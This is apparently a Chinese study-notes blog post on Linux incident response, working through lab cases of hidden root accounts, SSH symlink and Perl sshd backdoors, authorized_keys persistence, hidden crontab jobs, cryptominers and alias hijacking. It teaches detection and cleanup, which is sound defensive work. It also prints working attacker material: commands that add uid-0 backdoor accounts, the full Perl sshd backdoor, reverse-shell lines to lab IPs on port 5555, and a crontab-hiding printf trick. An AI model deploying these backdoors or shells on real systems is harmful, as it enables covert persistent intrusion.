---
title: Linux应急
date: 2026-07-22 00:03:19
tags:
- linux应急
category:
- 学习笔记
---

# Linux应急

## Linux后门应急一 - 增加超级用户账号

### 创建隐藏账户后门

#### 可以交互且允许uid=0的用户远程登录

**增加超级用户账号命令：**

```
echo "cshm:x:0:0::/:/bin/sh" >> /etc/passwd #增加超级用户账号
passwd cshm #修改cshm的密码为cshm123
```

然后使用ssh连接账户cshm：

```
用户名：cshm

输入账号：cshm 密码：cshm123 ,成功留下该账户后门，并且是root权限
```

---

#### 可以交互且不允许uid=0的用户远程登录

如果系统不允许 uid=0 的用户远程登录（因为root的uid=0），可以增加一个普通用户账号

设置不允许root账户远程登录，参考链接：https://www.cnblogs.com/binblogs/p/5201307.html

**增加超级用户账号命令：**

```
echo "wxg:x:1000:1000::/:/bin/sh" >> /etc/passwd  #增加普通用户账号
passwd wxg  #修改wxg的密码为wxg147258369
```

---

#### 不交互无回显添加Linux密码

**第一种：**

```
useradd wxg -u 0 -o -g root -G root|| echo "123456" | passwd --stdin wxg #创建账户wxg、密码123456且为root权限
useradd wxg -u 0 -o -g root -G root|| echo "123456" | passwd --stdin wxg #创建账户wxg、密码123456且为root权限
```

得执行命令两次才可以

wxg的权限查看为root权限

**第二种：**

```
useradd  test
echo "123456" | passwd --stdin test
```

权限较小，不是root权限

**第三种：**

```
useradd -u 0 -o -g root -G root user |echo -e "1qazwsx2wsx\n1qazwsx2wsx"|passwd user
```

也是得执行两次，并且对密码强度有要求

user的权限查看为root权限

---

### 应急发现隐藏账户后门

#### 查看可以远程登录的账号

```
awk '/\$1|\$6/{print $1}' /etc/shadow
```

---

#### 查看特权账户-查看哪些账号有root权限

```
awk -F: '$3==0 {print$1}' /etc/passwd
```

---

#### 排查异常账号的创建时间

进入 /home 目录，一半创建账户之后，会在 home 目录下新建一个账户的文件夹，因此可

以查看账户文件夹的的创建时间来确定账号创建时间

```
cd /home
ls -al
```

---

#### 查看历史执行命令

```
cd /home
cd xxx
ls -al
```

然后如果存在`.bash_history`文件

直接读取查看历史执行命令

```
cat .bash_history
```

如果不存在这个文件说明可能没有执行命令或者执行的命令已经被删除

---

#### 排查异常账号的ssh登录时间

**查看** **ssh** **登录成功的信息**

```
last
```

可以看到登录时间和登录地址

---

#### **查看** **ssh** **登录失败的信息**

```
lastb
```

---

### 查看root账户的历史命令

使用命令：

```
history
```

---

### 总结

```
通过日志排查的发现的信息，进行梳理
1、2023-07-17 08:10 IP：192.168.91.1 使用 root 账户第一次登录系统，失败，在 2023-07-17 08:12
成功登录系统

2、以 root 账户登录系统之后，创建了具有 root 权限的后门账户：cshm、xiaoge、xiaoge2、
wxiaoge2，具有普通权限的账户 wxg

3、成功留的后门账户：cshm、wxg、wxiaoge2
成功登录的后门账户：cshm、wxg、wxiaoge2
2023-07-17 08:14 登录了 cshm 账户
2023-07-17 08:15、2023-07-17 08:19 登录了 wxg 账户
2023-07-17 08:27 登录了 wxiaoge2 账户
一直登录失败的账户 wxiaoge、xiaoge，**推测是创建后门账户的命令错误导致**
2023-07-17 08:24、25、26 尝试登录 wxiaoge 账户，失败
2023-07-17 08:27 登录了 xiaoge 账户，失败

4、成功登录之后只有 wxiaoge2 账户执行过两条命令：whoami、pwd，**推测是攻击者测试后**
**门账户是否可以使用，以及账户的权限**
```

---

### 处置方式

#### 1、首先查看当前所有的账户

```
cat /etc/passwd
```

#### 2、执行强制删除账户的命令

```
userdel -rf cshm
userdel -rf wxg
userdel -rf xiaoge
userdel -rf xiaoge2
userdel -rf wxiaoge2
```

#### 3、最后确认一下异常账户是否成功删除

```
cat /etc/passwd
```

**发现均被删除**

---

## Linux后门应急二-SSH软链接后门

### 查看可以远程登录的账号

```
awk '/\$1|\$6/{print $1}' /etc/shadow
```

有root、zyr、wxiaoge

确定 wxiaoge 就是异常账户

### 查看特权账户

```
awk -F: '$3==0 {print$1}' /etc/passwd
```

发现只有root

### 排查异常账号创建时间

进入/home目录，一般创建账户之后，会在 home 目录下新建一个账户的文件夹，因此可

以查看账户文件夹的的创建时间来确定账号创建时间

```
cd /home
ls -al
```

发现有 wxiaoge 目录，

wxiaoge 创建时间为：2023-08-15 03:37

#### 查看wxiaoge历史执行命令

```
cd wxiaoge
ls -al

cat .bash_history
```

发现 wxiaoge2 账户执行过两条命令：whoami

### 排查异常账号的登录时间

**查看ssh登录成功的信息**

```
last
```

可以看到root 账户最先登录，登录时间为 2023-08-05 3 点 35，持续时间 03:35-03:37，共两分
钟，登录地址是 192.168.91.1

然后20023-08-05 03:37登录了wxiaoge账户，持续时间03:37-03:37 共 1 分钟，符合 wxiaoge账户执行的命令 whoami。

推测是登录了root账户然后创建wxiaoge账户并进行登录测试

**查看ssh登录失败的信息**

```
lastb
```

发现无登录失败日志

### 查看网络连接是否有异常

```
netstat -anpt
```

发现开启有12345、14725等异常端口，且程序名字为 su、wxiaoge，且 statue 的状态为监听，

也就是说任何 IP 都可以访问这两个接口

接下来排查这两个异常程序

**首先排查su，PID为7961**

```
ll /proc/7961
```

发现su指向可执行程序是/usr/sbin/sshd，怀疑被植入了软链接后门

**查看所有的 su 文件**

```
find -name su
```

然后在这些su文件中查找具体哪一个su是软链接后门

对每个文件执行一次ll命令

```
ll /usr/local/su
```

**最终确定软链接为：/usr/local/su**

---

然后排查 wxiaoge，PID 为 8091

```
ll /proc/8091
```

发现 wxiaoge 对应的程序也是 sshd，也是被植入了软链接后门

查看所有的 wxiaoge 文件，以及查找具体哪一个 wxiaoge 是软链接后门

```
find -name wxiaoge
```

```
ll /tmp/wxiaoge
```

最终确定软链接为：/tmp/wxiaoge

---

### 总结

**通过日志排查的发现的信息，进行梳理**

**1、2023-08-05 03:35，root 账户登录系统，持续时间 03:35-03:37，登录地址是 192.168.91.1。之后创建 wxiaoge 账户并进行登录测试。**

**2、也就是在 03:35-03:37 两分钟内，以 root 账户留了两个软连接后门：su、wxiaoge，后门软连接位置：/usr/local/su、/tmp/wxiaoge**

---

### 处置方式

#### 1、删除软链接后门

```
rm -rf /usr/local/su
rm -rf /tmp/wxiaoge
```

#### 2、然后再把异常的两个进程关闭

```
kill -9 7961
kill -9 8091
```

---

## Linux后门应急三-perl脚本SSH后门

### 查看可以远程登录的账号

查看 Linux 下看可以远程登录的账号信息，以及所有存在的账户

```
cat /etc/shadow
```

发现能登录系统的只有系统自带的两个账户 root、kali，并且询问系统管理员没有其它可疑或者新建账户

---

### 查看特权账户

查看哪些账户有 root 权限

```
awk -F: '$3==0 {print$1}' /etc/passwd
```

发现只有 root 账户具有 root 权限

---

### 排查异常账号是否登录过系统

#### 排查账号登录信息

```
last：查看登录成功的记录
lastb：查看登录失败的记录
```

发现没有登录失败的记录，且近期只有 root 登录成功的记录和时间

---

#### 查看网络连接是否有异常

```
netstat -anpt
```

发现两处异常连接

IP：192.168.91.1 使用 root 账户 ssh 的形式进行远程连接，

IP：192.168.91.165 使用不知名的方式进行远程连接，且登录成功的日志中并没有

192.168.91.165 的 IP 记录，说明这个可能是隧道后门或者其它后门连接方式

接下来首先排查 192.168.91.165 的异常后门程序，首先是 PID 为 47754

```
ll /proc/47754
```

查看进程

```
ps -ef|grep 47754
```

发现是/usr/bin/dash /bin/sh 可以确定就是 shell 后门连接。

但是竟然是通过 22 ssh 服务连接的，那么问题肯定出跟 ssh 文件有关系

接下来查看 192.168.91.1 通过 ssh 方式连接的 ssh 文件位置

```
ll /proc/50417
```

确定了 ssh 文件：/usr/bin/sshd

接下来查看/usr/bin/sshd 的创建时间和文件类型

```
cd /usr/bin
file sshd
stat sshd
```

发现最近改动时间是 20230819 5:51，且文件类型没有问题，是默认的类型 ELF 格式

然后查看文件内容

再仔细查看程序名称发现是/usr/sb（被截断了），这与 root 连接的/usr/bin/sshd 文件不一样。

```
netstat -anpt

#
tcp6       0      0 :::22                   :::*                    LISTEN      46742/sshd: /usr/sb 
```

系统默认的sshd程序文件位置，发现只有两个位置

```
/usr/sbin/sshd
/usr/bin/ssh
```

/usr/sb（被截断了）正好与**/usr/sb**in/sshd 对上了，那么接下来排查/usr/sbin/sshd 文件

```
cd /usr/sbin/

stat sshd

file sshd

cat sshd
```

发现/usr/sbin/sshd 文件的创建时间是 20230809 5：51，而且是 perl 脚本文件，之后查看脚

本文件的内容发现是后门文件

**sshd** **后门源码：**

```
#!/usr/bin/perl
exec"/bin/sh"if(getpeername(STDIN)=~/^..zf/);
exec{"/usr/bin/sshd"}"/usr/sbin/sshd",@ARGV;


含义：
第一行， 如果当前文件句柄 STDIN 是一个 socket，且 socket 的远程连接源端口是 31334（Big网络字节序中的 16 进制字符串为\x00\x00zf， 正好匹配上 perl 正则 …zf，上述代码中的 zf是 Big 网络字节序的 Ascii 表示形式），则执行/bin/sh，并结束当前程序运行（不会执行第二步），相当于反弹一个 root shell （因为 sshd 是以 root 权限运行的）给远程 socket （一般只有攻击者指定连接的源端口才能触发这一行的执行）第二行 启动 sshd (/usr/bin/sshd 是真正的 sshd)服务 ，凡是传递给/usr/sbin/sshd (后门)的参数都传递给真正的 sshd （这一行保证了普通用户也可以正常使用 ssh 服务，登录并不会有什么异常现象）

补充：
在网络通信当中，大多传递的数据是以二进制流（binary data）存在的。当传递字符串时，
不必担心太多的问题，而当传递诸如 int、char 之类的基本数据的时候，就需要有一种机制
将某些特定的结构体类型打包成二进制流的字符串然后再网络传输，而接收端也应该可以通
过某种机制进行解包还原出原始的结构体数据。python 中的 struct 模块就提供了这样的机制:
```

---

### 总结

通过日志排查的发现的信息，进行梳理

1、2023-08-19 05:51，root 账户登录系统，持续时间 05:51-06:00，登录地址是 192.168.91.1。

2、登录之后创建了 perl 脚本的 ssh 后门/usr/sbin/sshd，并且把正常的 ssh 文件移动到了：

/usr/bin/sshd。

3、创建后门之后使用 IP：192.168.91.141 连接了 perl 后门。

确实是不仔细看看不出来区别 usr/sbin/sshd、/usr/bin/sshd 的区别

---

### 处置方式

#### 1、删除/usr/sbin/sshd 文件

#### 2、将正常文件/usr/bin/sshd 移动到原来的位置/usr/sbin/sshd。

#### 3、重启 ssh服务即可

---

## Linux后门应急四-SSH公钥免密后门

### 查看可以远程登录的账号

```
awk '/\$1|\$6/{print $1}' /etc/shadow
```

发现能登录系统的两个账号root、zyr

---

### 查看特权账户

```
awk -F: '$3==0 {print$1}' /etc/passwd
```

发现只有 root 账户具有 root 权限，没有异常

---

### 排查账号登录系统情况

查看登录成功的记录

```
last
```

发现只有 root 账户在 5 月 15 日、9 月 2 日登录过系统，其中 9 月 2 日登录的的 IP 是192.168.40.1，且登录时间凌晨 2:09、2:13，询问客户，客户反馈没有在凌晨登录过此系统，因此可以确定问题最早出现在 9 月 2 日 2:09接下来查看登录失败的记录

```
lastb
```

发现没有登录失败的记录，说明没有被 ssh 爆破过，肯定不是暴力破解

---

### 查看网络连接是否有异常

```
netstat -anpt
```

发现异常：

1、服务器开了 22 号端口、6010 端口，且都是 ssh 程序，正常情况 ssh 协议的端口号是 22，

说明 6010 端口存在问题

2、22 端口端口连接的 IP：192.168.40.1 正是 9 月 2 日陵城登录的可疑 IP

这两处需要排查

接下来首先排查 6010 端口对应的 sshd，是 PID 为 8148

```
ll /proc/8148
```

发现是/usr/sbin/sshd 正常的程序文件

查看/usr/sbin/sshd 文件也没有发现被篡改过

```
stat /usr/sbin/sshd
```

接下来排查 22 端口对应的 sshd，是 PID 为 8145

```
ll /proc/8145
```

查看这两个程序的运行详细信息，发现它俩是同一个程序启动的，进程都是一模一样的，也没有可疑进程

```
systemctl status 8145
```

没有发现异常，既然没有发现异常，接下来排查登录日志

---

### 查看登录日志

通过 last 可以确定 9 月 2 日登录 IP 是 192.168.40.1 在凌晨 2:09、2:13 登录过系统，那么可以通过查看安全日志确定登录方式

```
cd /var/log/
cat secure
```

发现在 9 月 2 号 02:09:32 的时候使用 IP：192.168.40.1 通过密码的形式用 root 账户登录系统

在 9 月 2 号 02:13:54 的时候使用 IP：192.168.40.1 通过公钥的形式用 root 账户登录系统

那么，可以确定 root 账户密码已经泄露了，并且推测被留了 ssh 公钥免密后门

接下来，排查 ssh 公钥文件

```
cd /root
ls -al
cd .ssh
```

查看 authorized_keys 密钥文件的详细信息

```
ls -al
stat authorized_keys
```

发现 authorized_keys 文件的创建时间是在 2023-09-02 02:12:56，正好是在 02:09:32 第一次root 账户登录之后，在 02:13:54 通过公钥的形式用 root 账户登录系统之前，可以百分百确定被留了 ssh 公钥后门

查看 authorized_keys 文件内容如下，并且咨询系统管理员，不是他们设置的公钥信息

```
cat authorized_keys
```

---

### 总结

通过日志排查的发现的信息，进行梳理

1、root 密码已经被泄露，泄露方式未知

2、9 月 2 号 02:09:32 的时候使用 IP：192.168.40.1 通过密码的形式用 root 账户登录系统。

3、登录系统之后，开启 ssh 免密登录功能，留 SSH 公钥免密后门

4、在 9 月 2 号 02:13:54 的时候使用 IP：192.168.40.1 通过公钥的形式用 root 账户登录系统，

验证后门是否创建成功

---

### 处置方式

#### 1、修改root密码

```
echo "新密码" | passwd --stdin root
```

#### 2、删除黑客的公钥

```
rm -f /root/.ssh/authorized_keys
```

---

## Linux后门应急五-Crontab隐藏后门

### 查看远程登录账号

```
awk '/\$1|\$6/{print $1}' /etc/shadow
```

发现能登录系统的只有系统自带的两个账户 root、kali，

### 查看特权账户

查看哪些账户有root权限

```
awk -F: '$3==0 {print$1}' /etc/passwd
```

发现只有root账户有root权限

### 排查账号登录系统情况

```
查看登录成功的记录
last

查看登录失败的记录
lastb
```

发现没有登录失败的记录，只有root账户的记录，说明没有被 ssh 爆破过

### 查看网络连接是否有异常

```
netstat -anpt
```

发现异常：与 192.168.40.128 的 5555 端口进行连接

通过PID查看异常连接的进程，以及该进程正在执行的命令行命令

```
ps aux | grep 8063
```

发现 sh -i 是执行的 shell 命令

接下来查看 PID 为 8063 的父进程

```
cat /proc/8063/status
```

发现父进程 PID 是 8062

接下来查看 PID 为 8062 的进程，以及该进程正在执行的命令行命令

```
ps aux | grep 8062

cat /proc/8062/status
```

没有发现异常，继续查看 PID 为 8862 的父进程 8060

```
ps aux | grep 8060

cat /proc/8060/status
```

也没有发现异常，继续查看 PID 为 8060 的父进程 8058

```
ps aux | grep 8058

cat /proc/8058/status
```

也没有发现异常，继续查看 PID 为 8858 的父进程 1259

```
ps aux | grep 1259
```

发现是 /usr/sbin/crond -n 系统的定时任务

### 查看系统定时任务

#### 使用定时任务查看命令

```
crontab -l
```

返回no crontw_web for root

提示 root 账户没有定时任务，此处定时任务可能被隐藏了

#### 另一种查看定时任务的方法

```
cd /var/spool/cron
cat root
```

发现 cat 查看命令还是没有看到定时任务内容

#### 查看定时任务文件的修改时间

但是 ls -al，stat root 发现 root 定时任务文件的修改时间是 2：57，是在 root 账户登录的 2:52——3:00 之间

```
ls -al
stat root
```

使用vi命令查看文件

```
vi root
```

发现确实有 crontab 隐藏定时任务

` * * * * /etc/1.sh;^Mno crontw_wab for root  `

### 查看 /etc/1.sh 文件

```
cd /etc

#按照文件创建时间排序
ls -ltr
```

发现两个 777 权限的异常文件 1.sh 2.sh

查看文件内容

```
[root@localhost etc]# cat 1.sh
#!/bin/bash
sh -i >& /dev/tcp/192.168.40.128/5555 0>&1



[root@localhost etc]# cat 2.sh
(crontab -l;printf "* * * * * /etc/1.sh;\rno crontw_wab for `whoami`%100c\n")|crontab -
```

1.sh 文件是反弹 shell 到 192.168.40.128 的 5555 端口

2.sh 文件是将 1.sh 文件加入到定时任务

---

### 总结

通过日志排查的发现的信息，进行梳理

**1、root 密码已经被泄露，泄露方式未知**

**2、9 月 24 号 2:52 的时候使用 IP：192.168.40.1 通过密码的形式用 root 账户登录系统。**

**3、登录系统之后，创建 shell 文件 1.sh，2.sh 并添加 777 权限后执行 2.sh 创建了 crontab 隐藏后门**

**4、在 9 月 24 号 3:00 的时候登出系统没有进行再次登录，**

---

### 处置方式

#### 1、删除 1.sh、2.sh

```
rm -f /etc/1.sh
rm -f /etc/2.sh
```

#### 2、删除 root 定时任务

```
crontab -r
```

#### 3、验证定时任务已清空

```
crontab -l
# 输出 no crontab for root 就是正常、干净状态
```

#### 4、然后再确认一遍

```
cd /var/spool/cron
cat root
```

---

## Linux服务器挖矿病毒应急处理案例

### 事件背景

某天客户反馈：他的服务器，CPU 飙到 100%，然而他也没有做什么操作，没有运行消耗性能的程序，怀疑服务器存在异常。并且他已经给服务器断网处置，需要应急工程师取排查一下

---

### 查找异常并杀死进程

因为服务器 CPU 消耗持续 100%，所以使用 TOP 命令对 CPU 性能消耗程序进行从高到低的排

序，找到占用 cpu 的异常进程

右键选择“打开终端”

输入命令：

```
top
```

看到 PID 号 2240 的进程 rsync 消耗 CPU 非常高

使用命令：

```
kill -9 2240
```

杀死此进程

杀死此进程之后，观察 CPU 恢复正常，没有消耗到 100%

---

### 重新联网发现新的异常

因为客户之前给服务器进行断网处置，现在杀死进程之后，给服务器联网，看是否会再次出现异常

打开网络连接之后，过了几分钟之后，发现又新出现一个，PID 号 17350 的进程 kswapd0 消耗 CPU 非常高

而且查看网络连接，发现与 101.6.15.130、179.43.139.84、45.9.148.129 进行大量异常连接

```
netstat -anpt
```

查看这 3 个 IP 的威胁情报 101.6.15.130、179.43.139.84、45.9.148.129，发现均出现过异常，而且 45.9.148.129 还是矿池地址

接下来使用命令

```
kill -9 17370
```

杀死发现的异常进程，之后观察系统没有问题，正常运行

---

### 重启系统再次发现新的异常

重启系统命令：reboot

重启系统，使用命令：top，发现挖矿程序又出现了，看来挖矿病毒应该有定时任务或者重启后再次运行的后门

查看挖矿病毒文件的位置

```
systemctl status 2192
```

发现病毒文件在/home/zyr/\346\241\214\351\235\242/.rsync/b/sync 也就是/home/zyr/桌面

/.rsync/b/sync

接下进入/home/zyr/桌面/，执行 ls 查看文件，发现没有任何文件，怀疑挖矿文件被隐藏了

执行

```
ls -al
```

**查看所有文件，发现隐藏文件：.rsync**

```
cd .rsync
```

之后 cd b、进入目录 b

然后查看 sync 文件内容：

```
cat sync


#!/bin/sh
cd /home/zyr/桌面/.rsync/b
./run
```

发现是运行 run 文件

查看 run 文件内容，发现前半部分被 base64 加密

```
cat run
```

最后面是植入 ssh 公钥免密后门

之后又查看同目录下的目录 a

```
cd a
ls -al
cat run


#!/bin/bash
./stop
#./init0
sleep 10
pwd > dir.dir
dir=$(cat dir.dir)
ARCH=`uname -m`
	if [ "$ARCH" == "i686" ]; then
		nohup ./anacron >>/dev/null & 
	elif [ "$ARCH" == "x86_64" ];   then
		./kswapd0
	fi
echo $! > bash.pid




cat init0
```

发现是运行挖矿程序 kswapd0 的，而且 init0 文件是杀死其它挖矿病毒的文件，这样把其它挖矿病毒都杀死进程，只让 kswapd0 病毒文件运行

**可以确定整个 rsync 是挖矿病毒文件**

---

### **查看定时任务和** **ssh** 公钥后门

查看定时任务，命令：

```
crontab -l
```

发现可疑定时任务 4 个，都与.rsync 挖矿病毒相关

1 1 */2 * * /home/zyr/桌面/.rsync/a/upd>/dev/null 2>&1

5 8 * * 0 /home/zyr/桌面/.rsync/b/sync>/dev/null 2>&1

@reboot /home/zyr/桌面/.rsync/b/sync>/dev/null 2>&1

0 0 */3 * * /home/zyr/桌面/.rsync/c/aptitude>/dev/null 2>&1

查看 ssh 公钥

```
ls -al
cd .ssh
ls -al
cat authorized_keys


stat authorized_keys
```

发现就是前面发现的**/.rsync/b/run** 文件中的公钥，而且 authorized_keys 文件的更改时间也是最近重启时间

---

### 总结

通过日志排查的发现的信息，进行梳理

1、挖矿病毒文件：/home/zyr/桌面/.rsync

2、病毒文件的定时任务

1 1 */2 * * /home/zyr/桌面/.rsync/a/upd>/dev/null 2>&1

5 8 * * 0 /home/zyr/桌面/.rsync/b/sync>/dev/null 2>&1

@reboot /home/zyr/桌面/.rsync/b/sync>/dev/null 2>&1

0 0 */3 * * /home/zyr/桌面/.rsync/c/aptitude>/dev/null 2>&1

3、ssh 公钥免密后门：/home/zyr/.ssh/authorized_keys

---

### 处置方式

#### 1、先杀死挖矿病毒进程，然后删除挖矿病毒：rm -rf /home/zyr/桌面/.rsync

```
kill -9 2197
rm -rf /home/zyr/桌面/.rsync
```

#### 2、删除可疑定时任务

```
crontab -r

是否成功删除
crontab -l
```

#### 3、删除 ssh 公钥免密后门

```
rm -f /home/zyr/.ssh/authorized_keys
```

---

## Linux服务器综合应急案例一

### 事件背景

某天客户反馈：Linux 服务器有异常连接，疑似被入侵，192.168.184.145 是异常 IP

**受害服务器：**Linux 系统、IP：192.168.184.142、无 WEB 服务

---

### 查看异常连接文件的位置

#### 首先查看服务器所有的连接

```
netstat -anpt
```

发现有两个异常连接，都是与 192.168.184.145 的 5555 端口通信的，根据经验猜测是反弹的shell

---

#### 通过 PID 查看异常连接的进程

以及该进程正在执行的命令行命令

```
ps aux |grep 15011
```

发现是 bash 进程

接下来查看 PID 为 15011 的父进程

```
cat /proc/15011/status
```

发现父进程 PID 是 15010

接下来查看 PID 为 15010 的 进程，以及该进程正在执行的命令行命令

```
ps aux |grep 15010
```

发现是通过 /bin/bash 执行的 root 目录下的 1.sh 文件 （此处为找到的第一个可疑文件）

查看排查过程中发现的可疑文件 /root/1.sh 

```
cat /root/1.sh
```

发现其内容是反弹 shell 的命令，正是反弹到 192.168.184.145 的 5555 端口

```
bash -i >& /dev/tcp/192.168.184.145/5555 0>&1
```

---

接下来查看 PID 为 15010 的父进程

```
cat /proc/15010/status
```

发现父进程 PID 是 15009

接下来查看 PID 为 15009 的进程，以及该进程正在执行的命令行命令

```
ps aux |grep 15009
```

发现是通过 /bin/bash -c 指定将命令转为一个完整命令执行

接下来查看 PID 为 15009 的父进程

```
cat /proc/15009/status
```

发现父进程 PID 是 15007

接下来查看 PID 为 15007 的 进程，以及该进程正在执行的命令行命令

```
ps aux |grep 15007
```

发现是 /usr/sbin/CROND -n 跟网站的定时任务相关的

---

### 查看定时任务

查看定时任务

```
crontab -l
```

显示root账户没有定时文件

跟前面查看的 PID 为 15007 的 进程执行命令存在冲突，PID 为 15007 明明执行的是定时

任务的命令 /usr/sbin/CROND -n

那么只能去查看 root 账户是否存在定时任务文件

```
cd /var/spool/cron
cat root
vi root
```

发现是 crontab 隐藏后门，只能通过 vi 命令进行查看

```
* * * * * /root/1.sh;^Mno crontab for root 
```

---

### 查看 root 账户的历史命令

没有发现与有用的信息，可能部分命令已经被删除

```
history
```

接下里查看 1.sh 的详细信息

```
ls -l
```

发现 1.sh 与 2.sh 文件的创建时间十分接近，存在可疑

接下来查看 2.sh 文件的内容

```
cat 2.sh
```

是创建隐藏后门的命令

```
(crontab -l;printf "* * * * * /root/1.sh;\rno crontab for `whoami`%100c\n")|crontab -
```

### 总结

可疑文件 /root/1.sh、/root/2.sh 均为创建 crontab 隐藏后门的文件

且都是 4：00-5：00 之前执行的

---

### 攻击路径溯源

第一步

#### 查看 1.sh、2.sh 创建与修改的账户

发现都是 root 账户，怀疑 root 账户是弱口令或者被暴力破解

第二步

#### 查看 root 账户的登录日志

**root 的登录日志文件在： /var/log/secure-XXXXX**

```
cd /var/log
ls
```

随便查看一个 secure-20210420 文件的内容

```
cat secure-20210420
```

发现很多登录失败的记录，猜测root账户被暴力破解了

```
Apr 20 03:42:52 localhost sshd[8137]: Failed password for root from 192.168.184.1 port 3272 ssh2
Apr 20 03:42:52 localhost sshd[8145]: Failed password for root from 192.168.184.1 port 3275 ssh2
Apr 20 03:42:52 localhost sshd[8147]: Failed password for root from 192.168.184.1 port 3276 ssh2
Apr 20 03:42:52 localhost sshd[8148]: Failed password for root from 192.168.184.1 port 3277 ssh2
Apr 20 03:42:52 localhost sshd[8139]: Failed password for root from 192.168.184.1 port 3273 ssh2
Apr 20 03:42:52 localhost sshd[8151]: Failed password for root from 192.168.184.1 port 3278 ssh2
Apr 20 03:42:52 localhost sshd[8152]: Failed password for root from 192.168.184.1 port 3279 ssh2
Apr 20 03:42:52 localhost sshd[8157]: Failed password for root from 192.168.184.1 port 3281 ssh2
```

#### 统计日志中所有的登陆失败的记录命令

```
grep -o "Failed password" /var/log/secure* |uniq -c
```

发现在 secure-20200601 中有 76 条登录失败记录，在 secure-20210420 中有 1716 条登录失败记录，结合 1.sh 与 2.sh 文件的日期，猜测是在 20211020 日被暴力破解的

输出登录爆破的第一行和最后一行，确认爆破时间范围：20210420 03:28:39-03:43:24

```
第一行命令： grep "Failed password" /var/log/secure-20210420|head -1
最后一行命令：grep "Failed password" /var/log/secure-20210420|tail -1
```

#### 查询有哪些 IP 在爆破命令

```
grep "Failed password" /var/log/secure-20210420 | grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" | uniq -c
```

发现 192.168.184.1 爆破数量在 1000 多次，192.168.184.146 在 100 多次

#### 查询被爆破的用户名

```
grep "Failed password" /var/log/secure-20210420|perl -e 'while($_=<>){ /for(.*?) from/; print "$1\n";}'|uniq -c|sort -nr
```

发现被爆破的用户名是 root 账户

#### 统计登录成功的 IP 

```
grep "Accepted " /var/log/secure-20210420 | awk '{print $11}' | sort | uniq -c | sort -nr | more
```

发现 192.168.184.1 与 192.168.184.146 都成功登录该系统

#### 查询管理员最近登录情况

```
grep "Accepted " /var/log/secure-20210420 | awk '{print $1,$2,$3,$9,$11}'
```

---

### 总结

**1、爆破时间范围：20210420 03:28:39-03:43:24**

**2、爆破的账户：root**

**3、在爆破期间成功爆破出 root 账户的密码 IP：192.168.184.1、192.168.184.146**

**可疑 IP 192.168.184.1、192.168.184.146 成功爆破出系统 192.168.184.142 的 root 账户的密**

**码，并且留 crontab 隐藏后门与两个文件 /root/1.sh、/root/2.sh**

---

## Linux服务器综合应急案例二

### 事件背景

某天客户反馈：实验室因耗电量太大经常跳闸，服务器疑似被挖矿。

---

### 排查异常并清除病毒

使用命令 alias 查看是否异常别名

```
alias
```

发现服务器多了很多别名，所有的常用别名都别修改成了printf "" #输出为空

---

**unalias 别名 #删除添加的别名**

```
unalias adduser
unalias cp
unalias crontab
unalias find
```

---

### 查看服务器 **cpu** 使用率

使用 top 命令，查看服务器 cpu 使用率发现 cpu 使用率没有特别高的，接近或者超过 100%的进程

```
top
```

### 查看服务器 gpu使用率

使用 nvidia-smi 命令，查看服务器 gpu 使用率，gpu 使用率没有特别高的，接近或者超过100%的进程

```
nvidia-smi
```

### **查看服务器上的定时任务**

虽然 gpu 和 cpu 显示没有异常，但是态势感知上一直显示该服务器域矿池域名进行通信，并且经常因用电量过高跳闸，说明该服务器上确实含有挖矿病毒，病毒进程可能被隐藏根据经验，挖矿病毒一般会有定时任务，为了防止服务器关闭之后或者病毒程序被杀掉进程之后，挖矿程序不再运行那么接下来可以查看服务器上的定时任务

```
cd /var/spool/
ls -al
cd cron
```

查看所有的定时任务，发现在 /var/spool/cron/crontabs 的定时任务有异常

```
sudo chmod o-t crontabs
sudo chmod 755 crontabs
cd crontabs
ls -al
```

查看 root 和 zyr 定时任务内容

```
sudo chmod 755 root
sudo chmod 755 zyr
cat root
cat zyr
```

另外使用这个命令也能查看定时任务

```
sudo crontab -l
```

查看 root 和 zyr 定时任务创建时间为：20220217 10:27:33

```
cd /var/spool/cron/crontabs
stat *
```

---

### **根据定时任务查看对应文件或者程序**

前面zyr的定时任务中有对应文件

**查看** **b4nd1d0** **文件内容**

```
cd /home/zyr/
cat .b4nd1d
```

在 b4nd1d0 文件中 域名 eth-asia1.nanopool.org 很可疑，使用 微步 查看发现是一个公共矿池

**查看 b4nd1d0 文件创建时间**

```
stat .b4nd1d0
```

**查看 placi 文件内容**

```
cat placi
```

**查看 placi 文件创建时间**

```
stat placi
```

---

### **清除挖矿病毒和定时任务**

```
cd /home/zyr/
rm -rf .b4nd1d0
rm -rf placi

cd /var/spool/cron/crontabs
sudo rm -rf root
sudo rm -rf zyr
```

### **重启检查一下病毒有没有清除干净**

因为有的病毒会更改启动项，进行后门自启

**重启服务器试试**

```
reboot
```

重启服务器之后，检查 /var/spool/cron/crontabs 目录正常，没有病毒的痕迹

```
cd /var/spool/cron/crontabs
ls -al
```

但是发现 别名又都被修改了

```
alias
```

**推测别名可能被永久修改，意思就是每次重启服务器，别名都被修改一遍，而永久修改别名的位置在：**

```
/home/用户名/.bashrc
/root/.bashrc
/etc/.bashrc 针对所有用户生效
~/.bashrc 是针对当前用户生效
查看 /home/zyr/.bashrc 别名文件，发现可疑设置“source /var/tmp/.SQL-Unix/.SQL/.db”
```

**查看/var/tmp/.SQL-Unix/.SQL/.db 文件内容，正是修改的别名**

```
cat /var/tmp/.SQL-Unix/.SQL/.db
```

**查看 /root/.bashrc 别名文件**

```
sudo cat /root/.bashrc
```

**查看 /usr/.SQL-Unix/.SQL/.db 文件内容，正是修改的别名**

```
cat /usr/.SQL-Unix/.SQL/.db
```

**清除被修改的别名**

```
#删除别名文件
rm -rf /usr/.SQL-Unix/.SQL/.db
rm -rf /var/tmp/.SQL-Unix/.SQL/.db

#删除/root/.bashrc、 /home/zyr/.bashrc 文件
rm -rf /root/.bashrc
rm -rf /home/zyr/.bashrc
```

再次 reboot 重启服务器，别名没有再次出现

### **排查是否有遗留后门**

#### **查看是否有** **ssh** **软链接后门**

```
netstat -anpt
```

没有发现可疑的端口和用户，没有 ssh 软链接后门

#### **查看是否有增加超级用户帐号**

**查看特权账户**

```
awk -F: '$3==0 {print$1}' /etc/passwd
```

发现 sclipicibosu 账户是新增加超级用户帐号，那么此账户肯定是后门账户

**查看可以远程登录的账号信息**

```
awk '/\$1|\$6/{print $1}' /etc/shadow
```

发现新增加了一个账户 sclipicibosu ，那么更加确定此账户肯定是后门账号

**删除后门账户**

```
